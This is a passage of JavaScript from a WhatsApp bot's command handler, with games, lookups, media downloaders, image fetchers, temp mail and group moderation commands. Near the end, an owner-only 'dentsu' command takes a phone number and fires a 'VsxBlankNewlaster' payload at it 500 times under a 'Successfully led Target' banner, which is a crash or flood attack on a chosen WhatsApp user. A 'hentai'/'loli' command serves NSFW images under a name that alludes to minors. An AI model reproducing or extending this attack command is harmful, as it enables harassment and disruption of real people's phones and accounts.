        const ch = ['rock','paper','scissors','lizard','spock']; const u = arg.toLowerCase(); const b = RAND(ch);
        if (!ch.includes(u)) { await reply(`❌ Usage: *${PREFIX}rpsls <${ch.join('|')}>*`); break; }
        const win = { rock:['scissors','lizard'], paper:['rock','spock'], scissors:['paper','lizard'], lizard:['paper','spock'], spock:['rock','scissors'] };
        const r = u===b ? 'Draw' : win[u].includes(b) ? 'You win!' : 'Bot wins!';
        await reply(`🎮 You: ${u}\n🤖 Bot: ${b}\n→ *${r}*`); break;
      }
      case 'dice': { await reply(`🎲 *DICE*\nResult: *${Math.floor(Math.random()*6)+1}*`); break; }
      case 'coin': case 'coinbattle': { await reply(`🪙 *COIN*\n→ *${RAND(['Heads','Tails'])}*`); break; }
      case 'numberbattle': case 'numbattle': {
        const u = parseInt(arg) || Math.floor(Math.random()*100);
        const b = Math.floor(Math.random()*100);
        await reply(`🔢 You: ${u}\n🤖 Bot: ${b}\n→ *${u>b?'You win!':u<b?'Bot wins!':'Draw'}*`); break;
      }
      case 'hangman': {
        const key = jid;
        if (arg.length === 1) {
          const g = games.hangman.get(key);
          if (!g) { await reply(`❌ Start one first: *${PREFIX}hangman*`); break; }
          if (g.word.includes(arg.toLowerCase())) { g.guessed.add(arg.toLowerCase()); }
          else g.tries--;
          const masked = g.word.split('').map(c => g.guessed.has(c) ? c : '_').join(' ');
          if (!masked.includes('_')) { games.hangman.delete(key); await reply(`🎉 You won! Word: *${g.word}*`); break; }
          if (g.tries <= 0) { games.hangman.delete(key); await reply(`💀 Lost. Word: *${g.word}*`); break; }
          await reply(`🪢 *HANGMAN*\n${masked}\nTries left: ${g.tries}`);
        } else {
          const word = RAND(HANGMAN_WORDS);
          games.hangman.set(key, { word, guessed: new Set(), tries: 6 });
          await reply(`🪢 *HANGMAN started!*\n${'_ '.repeat(word.length).trim()}\nGuess: *${PREFIX}hangman <letter>*`);
        }
        break;
      }
      case 'tictactoe': { await reply('⭕ TicTacToe is being polished — multiplayer board coming soon.'); break; }
      case 'guess': {
        const key = jid;
        if (arg) {
          const g = games.guess.get(key); if (!g) { await reply(`❌ Start: *${PREFIX}guess*`); break; }
          const n = parseInt(arg); if (isNaN(n)) { await reply('❌ Number please.'); break; }
          if (n === g.n) { games.guess.delete(key); await reply(`🎯 Correct! It was *${g.n}*.`); }
          else await reply(n < g.n ? '⬆️ Higher!' : '⬇️ Lower!');
        } else {
          games.guess.set(key, { n: Math.floor(Math.random()*100)+1 });
          await reply(`🎯 *GUESS 1–100*\nReply: *${PREFIX}guess <number>*`);
        }
        break;
      }
      case 'math': {
        const key = jid;
        if (arg) {
          const g = games.math.get(key); if (!g) { await reply(`❌ Start: *${PREFIX}math*`); break; }
          const n = parseFloat(arg); games.math.delete(key);
          await reply(n === g.r ? `🎉 Correct! ${g.q} = ${g.r}` : `❌ Wrong. ${g.q} = ${g.r}`);
        } else {
          const a = Math.floor(Math.random()*20)+1, b = Math.floor(Math.random()*20)+1;
          const op = RAND(['+','-','*']); const r = eval(`${a}${op}${b}`);
          games.math.set(key, { q: `${a}${op}${b}`, r });
          await reply(`🧮 *MATH*\n${a} ${op} ${b} = ?\nReply: *${PREFIX}math <answer>*`);
        }
        break;
      }
      case 'emojiquiz': {
        const arr = [{q:'🍔🍟',a:'fast food'},{q:'🎬🍿',a:'cinema'},{q:'🚗💨',a:'fast & furious'},{q:'👑🐛',a:'queen bug'}];
        const p = RAND(arr); await reply(`🎲 *EMOJI QUIZ*\n${p.q}\n_Answer:_ ||${p.a}||`); break;
      }
      case 'gamefact': { await reply(`🎮 *GAME FACT*\nThe first video game was created in 1958: "Tennis for Two".`); break; }
      case 'toimg': case 'take': case 'steal': case 'wm': case 'qc': {
        await reply(`🖼️ *${cmd.toUpperCase()}* — sticker tooling requires ffmpeg/sharp pipeline. Send a sticker/image as a reply once enabled on your panel.`);
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // SOUND MENU (ffmpeg-based — graceful placeholders for now)
      // ═════════════════════════════════════════════════════════════════════
      case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast':
      case 'nightcore': case 'reverse': case 'robot': case 'slow':
      case 'smooth': case 'squirrel': {
        await reply(`🔊 *${cmd.toUpperCase()}*\nReply to an audio. (Requires ffmpeg on Pterodactyl egg — install via \`apt-get install ffmpeg\`.)`);
        break;
      }
      case 'tts': case 'say': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}tts <text>*`); break; }
        const url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(arg)}&tl=en&client=tw-ob`;
        try {
          const r = await axios.get(url, { responseType: 'arraybuffer', headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 15000 });
          await natsu.sendMessage(jid, { audio: Buffer.from(r.data), mimetype: 'audio/mpeg', ptt: true, contextInfo: forwardedContext() }, { quoted: msg });
        } catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // TEMP MAIL MENU
      // ═════════════════════════════════════════════════════════════════════
      case 'newmail': case 'tempmail2': {
        try {
          const r = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1', { timeout: 6000 });
          updateState(s => { s.tempmail = r.data[0]; });
          await reply(`📧 *Temp mail*\n\n\`${r.data[0]}\`\nRead with: *${PREFIX}readmail*`);
        } catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'readmail': case 'tempmail-inbox': {
        const s = getState(); if (!s.tempmail) { await reply(`❌ Generate one: *${PREFIX}newmail*`); break; }
        const [login, domain] = s.tempmail.split('@');
        try {
          const r = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`, { timeout: 6000 });
          if (!r.data.length) { await reply(`📭 Inbox empty for \`${s.tempmail}\``); break; }
          let out = `📬 *Inbox — ${s.tempmail}*\n\n`;
          for (const m of r.data.slice(0, 5)) {
            const det = await axios.get(`https://www.1secmail.com/api/v1/?action=readMessage&login=${login}&domain=${domain}&id=${m.id}`, { timeout: 6000 });
            out += `📨 *${det.data.subject}*\nFrom: ${det.data.from}\n${(det.data.textBody||det.data.body||'').slice(0,300)}\n\n`;
          }
          await reply(out);
        } catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'deltmp': { updateState(s => { delete s.tempmail; }); await reply('🗑️ Temp mail deleted.'); break; }

      // ═════════════════════════════════════════════════════════════════════
      // OTHER MENU
      // ═════════════════════════════════════════════════════════════════════
      case 'weatherwiki': case 'weather': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}weather <city>*`); break; }
        try {
          const r = await axios.get(`https://wttr.in/${encodeURIComponent(arg)}?format=j1`, { timeout: 5000 });
          const c = r.data.current_condition[0], a = r.data.nearest_area[0];
          await reply(`🌍 *${a.areaName[0].value}, ${a.country[0].value}*\n☀️ ${c.temp_C}°C — ${c.weatherDesc[0].value}\n💧 ${c.humidity}% • 💨 ${c.windspeedKmph} km/h`);
        } catch { await reply('❌ Weather error.'); }
        break;
      }
      case 'currency': {
        const p = arg.split(/\s+/); if (p.length < 3) { await reply(`❌ Usage: *${PREFIX}currency 100 USD EUR*`); break; }
        const [amt, from, to] = p;
        try { const r = await axios.get(`https://api.exchangerate-api.com/v4/latest/${from.toUpperCase()}`, { timeout: 5000 });
          const v = (parseFloat(amt) * r.data.rates[to.toUpperCase()]).toFixed(2);
          await reply(`💱 ${amt} ${from.toUpperCase()} = *${v} ${to.toUpperCase()}*`); }
        catch { await reply('❌ Rate unavailable.'); }
        break;
      }
      case 'time': {
        const d = new Date();
        await reply(`🕐 ${d.toLocaleString('en-US', { weekday:'long', year:'numeric', month:'long', day:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', timeZoneName:'short' })}`);
        break;
      }
      case 'qrcode': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}qrcode <text>*`); break; }
        await img(`https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(arg)}`, `📱 QR for: ${arg}`);
        break;
      }
      case 'readqr': { await reply('🔍 Reply to a QR image (feature requires sharp/jimp — coming soon).'); break; }
      case 'shorturl': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}shorturl <url>*`); break; }
        try { const r = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(arg)}`, { timeout: 5000 });
          await reply(`🔗 ${r.data}`); }
        catch { await reply('❌ Error.'); }
        break;
      }
      case 'myip': {
        try { const r = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
          await reply(`🌐 Bot IP: *${r.data.ip}*`); }
        catch { await reply('❌ Error.'); }
        break;
      }
      case 'iplookup': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}iplookup <ip>*`); break; }
        try { const r = await axios.get(`https://ipapi.co/${arg}/json/`, { timeout: 5000 });
          const d = r.data; await reply(`🌐 *${d.ip}*\n📍 ${d.city}, ${d.region}, ${d.country_name}\n🏢 ${d.org}\n🕐 ${d.timezone}`); }
        catch { await reply('❌ Lookup failed.'); }
        break;
      }
      case 'jid': { await reply(`🆔 *Chat JID:* ${jid}\n👤 *Sender:* ${senderJid}`); break; }
      case 'getpp': {
        const tgt = arg.replace(/\D/g, '') ? `${arg.replace(/\D/g,'')}@s.whatsapp.net` : senderJid;
        try { const url = await natsu.profilePictureUrl(tgt, 'image'); await img(url, `📸 PP of +${tgt.split('@')[0]}`); }
        catch { await reply('❌ No profile picture available.'); }
        break;
      }
      case 'github': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}github <user>*`); break; }
        try { const r = await axios.get(`https://api.github.com/users/${arg}`, { timeout: 5000 });
          const u = r.data;
          await img(u.avatar_url, `🐙 *${u.login}*\n${u.name || ''}\n${u.bio || ''}\n👥 Followers: ${u.followers}\n📦 Repos: ${u.public_repos}\n🔗 ${u.html_url}`); }
        catch { await reply('❌ User not found.'); }
        break;
      }
      case 'npm': case 'npmstalk': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}npm <package>*`); break; }
        try { const r = await axios.get(`https://registry.npmjs.org/${arg}`, { timeout: 5000 });
          const d = r.data; await reply(`📦 *${d.name}*\n${d.description || ''}\nLatest: ${d['dist-tags']?.latest}\nLicense: ${d.license || 'N/A'}\nHome: ${d.homepage || ''}`); }
        catch { await reply('❌ Package not found.'); }
        break;
      }
      case 'ffstalk': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}ffstalk <FreeFireID>*`); break; }
        const d = await tryFetch([`https://api.giftedtech.web.id/api/stalk/ffstalk?apikey=gifted&id=${arg}`]);
        if (!d) { await reply('❌ Stalk failed.'); break; }
        await reply(`🎮 *Free Fire*\n${JSON.stringify(d.result || d, null, 2).slice(0, 1500)}`);
        break;
      }
      case 'imbd': case 'imdb': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}imdb <title>*`); break; }
        const d = await tryFetch([`https://api.giftedtech.web.id/api/search/imdb?apikey=gifted&query=${encodeURIComponent(arg)}`]);
        if (!d) { await reply('❌ Not found.'); break; }
        const r = d.result || d;
        await reply(`🎬 *${r.title || arg}*\n${r.plot || r.description || ''}\n⭐ ${r.rating || ''}\n📅 ${r.year || ''}`);
        break;
      }
      case 'dictionary': case 'dict': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}dict <word>*`); break; }
        try {
          const r = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(arg)}`, { timeout: 5000 });
          const e = r.data[0]; let t = `📖 *${e.word}* ${e.phonetic||''}\n\n`;
          for (const m of e.meanings.slice(0,2)) { t += `*${m.partOfSpeech}*\n• ${m.definitions[0].definition}\n\n`; }
          await reply(t.trim());
        } catch { await reply('❌ Not found.'); }
        break;
      }
      case 'recipe': case 'recipe-ingredient': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}recipe <dish>*`); break; }
        try { const r = await axios.get(`https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(arg)}`, { timeout: 6000 });
          const m = r.data.meals?.[0]; if (!m) throw 0;
          let ing = ''; for (let i=1;i<=20;i++) { const n=m[`strIngredient${i}`], q=m[`strMeasure${i}`]; if (n) ing+=`• ${q} ${n}\n`; }
          await img(m.strMealThumb, `🍲 *${m.strMeal}*\n📍 ${m.strArea}\n\n*Ingredients:*\n${ing}\n*Instructions:*\n${m.strInstructions.slice(0,800)}...`); }
        catch { await reply('❌ Recipe not found.'); }
        break;
      }
      case 'book': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}book <title>*`); break; }
        try { const r = await axios.get(`https://www.googleapis.com/books/v1/volumes?q=${encodeURIComponent(arg)}&maxResults=3`, { timeout: 6000 });
          let t = `📚 *Books — ${arg}*\n\n`;
          for (const b of r.data.items || []) { const v=b.volumeInfo; t += `📖 ${v.title}\n👤 ${(v.authors||[]).join(', ')}\n🔗 ${v.infoLink}\n\n`; }
          await reply(t); }
        catch { await reply('❌ Error.'); }
        break;
      }
      case 'remind': {
        const m = arg.match(/^(\d+)\s+(.+)/);
        if (!m) { await reply(`❌ Usage: *${PREFIX}remind <minutes> <text>*`); break; }
        const [, mins, txt] = m; await reply(`⏰ Reminder set in ${mins} min.`);
        setTimeout(() => sendText(natsu, jid, `⏰ *REMINDER:* ${txt}`, msg), parseInt(mins) * 60000);
        break;
      }
      case 'calculate': case 'calc': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}calc <expr>*`); break; }
        try { const safe = arg.replace(/[^0-9+\-*/().%\s]/g,''); const r = Function(`"use strict"; return (${safe})`)();
          await reply(`🧮 ${safe} = *${r}*`); } catch { await reply('❌ Invalid expression.'); }
        break;
      }
      case 'mathfact': {
        const n = parseInt(arg) || Math.floor(Math.random()*100);
        try { const r = await axios.get(`http://numbersapi.com/${n}/math`, { timeout: 5000 });
          await reply(`🔢 *MATH FACT*\n${r.data}`); }
        catch { await reply('❌ Error.'); }
        break;
      }
      case 'sciencefact': {
        const f = ['Light from the Sun takes 8 minutes to reach Earth.','Bananas are radioactive (a tiny bit).','A teaspoon of neutron star weighs ~6 billion tons.'];
        await reply(`🔬 *SCIENCE FACT*\n${RAND(f)}`); break;
      }
      case 'horoscope': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}horoscope <sign>*`); break; }
        const d = await tryFetch([`https://aztro.sameerkumar.website/?sign=${arg.toLowerCase()}&day=today`,
          `https://horoscope-app-api.vercel.app/api/v1/get-horoscope/daily?sign=${arg.toLowerCase()}&day=TODAY`]);
        if (!d) { await reply('❌ Error.'); break; }
        await reply(`🔮 *${arg.toUpperCase()} — TODAY*\n\n${d.description || d.data?.horoscope_data || JSON.stringify(d).slice(0,500)}`);
        break;
      }
      case 'password': case 'genpass': {
        const len = parseInt(arg) || 16;
        const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
        let p = ''; for (let i=0;i<len;i++) p += c[Math.floor(Math.random()*c.length)];
        await reply(`🔐 *Password*\n\n\`${p}\``); break;
      }
      case 'readmore': { await reply('📜 readmore — use the invisible character \u200E (already supported in long messages).'); break; }
      case 'lidch': case 'idch': { await reply(`📡 Channel JID: ${NEWSLETTER_JID}`); break; }
      case 'react-ch': { await reply('💞 Reactions on channels require channel admin access.'); break; }

      // ═════════════════════════════════════════════════════════════════════
      // RANDOM IMAGE
      // ═════════════════════════════════════════════════════════════════════
      case 'sfw': case 'moe': case 'aipic': {
        const url = await fetchAnyImage([
          'https://api.waifu.pics/sfw/waifu',
          'https://nekos.best/api/v2/neko',
        ]);
        if (url) await img(url, `🖼️ *${cmd.toUpperCase()}*`); else await reply('❌ Error.');
        break;
      }
      case 'hentai': case 'loli': {
        const url = await fetchAnyImage([`https://api.waifu.pics/nsfw/${cmd==='loli'?'waifu':'waifu'}`,'https://nekos.life/api/v2/img/Random_hentai_gif']);
        if (url) await img(url, `🔞 *${cmd.toUpperCase()}*`); else await reply('❌ Error.');
        break;
      }
      case 'chinagirl': case 'bluearchive': case 'boypic': case 'carimage':
      case 'random-girl': case 'hijab-girl': case 'indonesia-girl':
      case 'japan-girl': case 'korean-girl': case 'malaysia-girl':
      case 'profile-pictures': case 'tiktokgirl': {
        const url = await fetchAnyImage([
          `https://api.giftedtech.web.id/api/sfw/${cmd.replace('-','')}?apikey=gifted`,
          `https://api.giftedtech.web.id/api/anime/${cmd.replace('-','')}?apikey=gifted`,
          'https://api.waifu.pics/sfw/waifu',
        ]);
        if (url) await img(url, `🖼️ *${cmd.toUpperCase()}*`); else await reply('❌ Try again later.');
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // PAYMENT MENU
      // ═════════════════════════════════════════════════════════════════════
      case 'aza': case 'account': {
        const s = getState();
        await reply(`💳 *Account*\n\n${s.account || `Not set. Use *${PREFIX}setaccount <details>*`}`); break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // ANIME
      // ═════════════════════════════════════════════════════════════════════
      case 'achar': {
        const d = await tryFetch([`https://api.jikan.moe/v4/characters?q=${encodeURIComponent(arg||'naruto')}&limit=1`]);
        const c = d?.data?.[0]; if (!c) { await reply('❌ Not found.'); break; }
        await img(c.images?.jpg?.image_url, `🎌 *${c.name}*\n${c.about?.slice(0,800) || ''}`); break;
      }
      case 'aquote': {
        const d = await tryFetch(['https://animechan.io/api/v1/quotes/random']);
        const q = d?.data; if (!q) { await reply(`💬 "I'll become the Pirate King!" — Luffy`); break; }
        await reply(`💬 *${q.character?.name}* (${q.anime?.name})\n\n"${q.content}"`); break;
      }
      case 'arecommend': {
        const d = await tryFetch(['https://api.jikan.moe/v4/recommendations/anime']);
        const r = d?.data?.[0]?.entry?.[0]; if (!r) { await reply('❌ Error.'); break; }
        await img(r.images?.jpg?.image_url, `🎌 Recommended: *${r.title}*\n🔗 ${r.url}`); break;
      }
      case 'asearch': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}asearch <anime>*`); break; }
        const d = await tryFetch([`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(arg)}&limit=1`]);
        const a = d?.data?.[0]; if (!a) { await reply('❌ Not found.'); break; }
        await img(a.images?.jpg?.image_url, `🎌 *${a.title}*\n⭐ ${a.score}\n📅 ${a.year}\n📺 ${a.episodes} ep\n\n${a.synopsis?.slice(0,600)}`);
        break;
      }
      case 'maid': case 'megumin': case 'neko': case 'shinobu': case 'waifu': {
        const url = await fetchAnyImage([`https://api.waifu.pics/sfw/${cmd}`, `https://nekos.best/api/v2/${cmd}`]);
        if (url) await img(url, `🌸 *${cmd.toUpperCase()}*`); else await reply('❌ Try again.');
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // CONVERTER
      // ═════════════════════════════════════════════════════════════════════
      case 'telegraph': { await reply('📝 Telegraph upload requires reply to image/text (will be enabled with multipart upload pipeline).'); break; }
      case 'url': { await reply(`🔗 ${PREFIX}url — short an URL: ${PREFIX}shorturl <url>`); break; }

      // ═════════════════════════════════════════════════════════════════════
      // DOWNLOADER
      // ═════════════════════════════════════════════════════════════════════
      case 'apk': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}apk <app name>*`); break; }
        const d = await tryFetch([`https://api.giftedtech.web.id/api/download/apkdl?apikey=gifted&appName=${encodeURIComponent(arg)}`]);
        const r = d?.result; if (!r?.dllink) { await reply('❌ Not found.'); break; }
        await reply(`📲 *${r.name}*\n📦 ${r.size}\n🔗 ${r.dllink}`); break;
      }
      case 'fb': case 'insta': case 'pint': case 'mp4': case 'video':
      case 'yta': case 'ytv': case 'ytmp3': case 'play': case 'song': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}${cmd} <url or query>*`); break; }
        await reply(`⏳ Downloading via *${cmd}*...`);
        const endpoints = {
          fb:    [`https://api.giftedtech.web.id/api/download/facebook?apikey=gifted&url=${encodeURIComponent(arg)}`],
          insta: [`https://api.giftedtech.web.id/api/download/instagram?apikey=gifted&url=${encodeURIComponent(arg)}`],
          pint:  [`https://api.giftedtech.web.id/api/download/pinterestdl?apikey=gifted&url=${encodeURIComponent(arg)}`],
          mp4:   [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
          video: [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
          ytv:   [`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(arg)}`],
          yta:   [`https://api.giftedtech.web.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(arg)}`],
          ytmp3: [`https://api.giftedtech.web.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(arg)}`],
          play:  [`https://api.giftedtech.web.id/api/download/dlmp3?apikey=gifted&query=${encodeURIComponent(arg)}`,
                  `https://api.giftedtech.web.id/api/download/yts?apikey=gifted&query=${encodeURIComponent(arg)}`],
          song:  [`https://api.giftedtech.web.id/api/download/dlmp3?apikey=gifted&query=${encodeURIComponent(arg)}`],
        };
        const d = await tryFetch(endpoints[cmd]);
        const r = d?.result || d;
        const url = r?.download_url || r?.dl_url || r?.url || r?.audio || r?.video || r?.[0]?.url;
        if (!url) { await reply(`❌ Could not fetch ${cmd}.`); break; }
        const isAudio = ['yta','ytmp3','play','song'].includes(cmd);
        try {
          if (isAudio) await natsu.sendMessage(jid, { audio: { url }, mimetype: 'audio/mpeg', contextInfo: forwardedContext() }, { quoted: msg });
          else await natsu.sendMessage(jid, { video: { url }, caption: `🎬 ${r.title || ''}`, contextInfo: forwardedContext() }, { quoted: msg });
        } catch (e) { await reply(`🔗 ${url}\n(direct send failed: ${e.message})`); }
        break;
      }
      case 'git': case 'github-dl': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}git <user/repo>*`); break; }
        await reply(`📦 ZIP: https://github.com/${arg}/archive/refs/heads/main.zip`); break;
      }
      case 'gitclone': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}gitclone <repo url>*`); break; }
        const m = arg.match(/github\.com\/([^/]+\/[^/]+)/);
        if (!m) { await reply('❌ Invalid github URL.'); break; }
        const zip = `https://github.com/${m[1].replace(/\.git$/,'')}/archive/refs/heads/main.zip`;
        try { await natsu.sendMessage(jid, { document: { url: zip }, fileName: `${m[1].split('/').pop()}.zip`, mimetype: 'application/zip', contextInfo: forwardedContext() }, { quoted: msg }); }
        catch { await reply(`🔗 ${zip}`); }
        break;
      }
      case 'mega': case 'edit': {
        await reply(`⚠️ *${cmd}* — needs heavy media pipeline. Coming once ffmpeg/sharp are enabled on your Pterodactyl egg.`);
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // EXISTING LIGHTWEIGHT COMMANDS KEPT
      // ═════════════════════════════════════════════════════════════════════
      case 'info': {
        const up = process.uptime(); const h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
        await img(MENU_IMAGE,
`ℹ️ *${BOT_NAME} INFO*
🛠️ Library: Baileys + Telegraf
📞 Pairing Code (8 digits)
🟢 Active • ⏱️ ${h}h ${m}m
👑 Dev: ${DEV_NAME}`);
        break;
      }
      case 'cat': {
        try { const r = await axios.get('https://api.thecatapi.com/v1/images/search', { timeout: 5000 });
          await img(r.data[0].url, '🐱 Cute cat!'); } catch { await reply('❌'); } break;
      }
      case 'dog': {
        try { const r = await axios.get('https://dog.ceo/api/breeds/image/random', { timeout: 5000 });
          await img(r.data.message, '🐶 Cute dog!'); } catch { await reply('❌'); } break;
      }
      case 'crypto': {
        const coin = (arg || 'bitcoin').toLowerCase();
        try { const r = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
          params: { ids: coin, vs_currencies: 'usd,eur', include_24hr_change: true }, timeout: 5000 });
          const d = r.data[coin]; if (!d) throw 0;
          await reply(`💰 *${coin.toUpperCase()}*\n💵 $${d.usd}\n💶 €${d.eur}\n📈 24h: ${Number(d.usd_24h_change).toFixed(2)}%`);
        } catch { await reply('❌'); } break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // OWNER / INFO
      // ═════════════════════════════════════════════════════════════════════
      case 'owner': {
        try {
          const vcard =
`BEGIN:VCARD
VERSION:3.0
FN:${OWNER_NAME}
TEL;type=CELL;type=VOICE;waid=${OWNER_NUMBER}:+${OWNER_NUMBER}
END:VCARD`;
          await natsu.sendMessage(jid, {
            contacts: { displayName: OWNER_NAME, contacts: [{ vcard }] },
            contextInfo: forwardedContext(),
          }, { quoted: msg });
        } catch {}
        await img(RAND(MENU_IMAGES),
`👑 *OWNER — ${OWNER_NAME}*
📞 +${OWNER_NUMBER}
💬 WhatsApp : ${OWNER_WA}
✈️ Telegram : ${OWNER_TG}
🐙 GitHub   : ${OWNER_GITHUB}

🤖 *${BOT_NAME}* ${BOT_VERSION}
> Dev: ${DEV_NAME}`);
        break;
      }
      case 'repo': {
        await reply(`📦 *${BOT_NAME}* ${BOT_VERSION}\n🔗 ${REPO_URL}\n👑 ${DEV_NAME}`);
        break;
      }
      case 'setprefix': {
        if (!msg.key.fromMe && !state.sudo.includes(senderNum)) { await reply('❌ Owner/sudo only.'); break; }
        const np = (arg || '').trim()[0];
        if (!np) { await reply(`❌ Usage: *${PREFIX}setprefix <char>*`); break; }
        updateState(s => { s.prefix = np; });
        await reply(`✅ Préfixe principal mis à *${np}* (les autres préfixes restent actifs : ${PREFIXES.join(' ')}).`);
        break;
      }
      case 'restart': {
        if (!msg.key.fromMe && !state.sudo.includes(senderNum)) { await reply('❌ Owner/sudo only.'); break; }
        await reply('♻️ Restart…');
        setTimeout(() => process.exit(0), 800);
        break;
      }
      case 'eval': {
        if (!msg.key.fromMe) { await reply('❌ Owner only.'); break; }
        if (!arg) { await reply(`❌ Usage: *${PREFIX}eval <code>*`); break; }
        try {
          // eslint-disable-next-line no-eval
          let out = await eval(`(async()=>{ ${arg.includes('return')?arg:'return '+arg} })()`);
          if (typeof out !== 'string') out = JSON.stringify(out, null, 2);
          await reply(`📤 ${String(out).slice(0, 3500)}`);
        } catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case "dentsu": {
        if (!isCreator) return reply('❌ 𝗢𝗻𝗹𝘆 𝗺𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝘂𝘀𝗲 𝗺𝗲')
        if (!text) return reply(`* Wrong Format ❌*\nExample : ${cmd} 243xxx`)

        let pepec = args[0].replace(/[^0-9]/g, "")
        let target = pepec + '@s.whatsapp.net'

        reply(`
╭──────────────❍
│ ─( 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒍𝒆𝒅 𝑻𝒂𝒓𝒈𝒆𝒕 )─
│
│⪼ 𝑇𝑦𝑝𝑒 : *${cmd}*
│⪼ 𝑇𝑎𝑟𝑔𝑒𝑡 : *${pepec}*
╰──────────────❍
 𝑷𝒍𝒆𝒂𝒔𝒆 𝑷𝒂𝒖𝒔𝒆 𝟏𝟎 𝑴𝒊𝒏𝒖𝒕𝒆𝒔

© *⚰️⃟𝐃𝐄𝐍𝐓𝐒𝐔*`)

        await new Promise(r => setTimeout(r, 1000));

        for (let i = 0; i < 100; i++) {
          await VsxBlankNewlaster(natsu, target);
          await VsxBlankNewlaster(natsu, target);
          await VsxBlankNewlaster(natsu, target);
          await VsxBlankNewlaster(natsu, target);
          await VsxBlankNewlaster(natsu, target);
        }
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // GROUP — tagadmins / warn system
      // ═════════════════════════════════════════════════════════════════════
      case 'tagadmins': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const { admins } = await getGroupAdmins(natsu, jid);
        if (!admins.length) { await reply('❌ No admins.'); break; }
        const txt = `👮 *ADMINS*\n\n${admins.map(a => `• @${a.split('@')[0]}`).join('\n')}\n\n${arg || ''}`;
        await natsu.sendMessage(jid, { text: txt, mentions: admins, contextInfo: forwardedContext() }, { quoted: msg });
        break;
      }
      case 'warn': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const { admins } = await getGroupAdmins(natsu, jid);
        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) { await reply('❌ Admins only.'); break; }
        const target = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
                    || msg.message?.extendedTextMessage?.contextInfo?.participant;
        if (!target) { await reply(`❌ Usage : reply or @mention.`); break; }
        let kicked = false;
        updateState(s => {
          s.warns[jid] ??= {};
          s.warns[jid][target] = (s.warns[jid][target] || 0) + 1;
          if (s.warns[jid][target] >= 3) { kicked = true; delete s.warns[jid][target]; }
        });
        if (kicked) {
          try { await natsu.groupParticipantsUpdate(jid, [target], 'remove'); } catch {}
          await natsu.sendMessage(jid, { text: `⛔ @${target.split('@')[0]} kické (3/3 warns).`, mentions: [target], contextInfo: forwardedContext() });
        } else {
          const c = getState().warns[jid][target];
          await natsu.sendMessage(jid, { text: `⚠️ @${target.split('@')[0]} averti (${c}/3). ${arg || ''}`, mentions: [target], contextInfo: forwardedContext() }, { quoted: msg });
        }
        break;
      }
      case 'warns': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const w = getState().warns[jid] || {};
        const entries = Object.entries(w);
        if (!entries.length) { await reply('✅ Aucun warn dans ce groupe.'); break; }
        const txt = `⚠️ *WARNS*\n\n${entries.map(([u,c]) => `• @${u.split('@')[0]} → ${c}/3`).join('\n')}`;
        await natsu.sendMessage(jid, { text: txt, mentions: entries.map(([u]) => u), contextInfo: forwardedContext() });
        break;
      }
      case 'resetwarn': {
        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
        const { admins } = await getGroupAdmins(natsu, jid);
        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) { await reply('❌ Admins only.'); break; }
        const target = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        updateState(s => {
